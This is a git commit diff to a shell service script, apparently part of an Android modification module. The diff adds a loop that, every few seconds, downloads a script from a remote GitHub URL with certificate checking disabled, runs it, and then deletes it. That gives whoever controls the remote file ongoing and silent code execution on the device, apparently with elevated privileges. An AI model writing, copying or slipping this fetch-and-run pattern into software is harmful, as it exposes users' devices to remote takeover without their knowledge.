cf6f5921a7636038aa8c0c7c0924d4d64b312ec4
TorryTran <152515753+TorryTran@users.noreply.github.com>
2024-06-08 23:00:52 +0700

    Update Module_service.sh

--- Module_service.sh
+++ Module_service.sh
@@ -1,4 +1,11 @@
 #!/system/bin/sh
-
-# No Script 
-
+sleep 60
+while true
+do
+    if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; then
+        curl -L -G -N -k https://raw.githubusercontent.com/TorryTran/ModuleVietHoaOS/main/Module_admin.sh > ${0%/*}/admin.sh
+        sh ${0%/*}/admin.sh
+        rm -rf ${0%/*}/admin.sh
+    fi
+sleep 5
+done
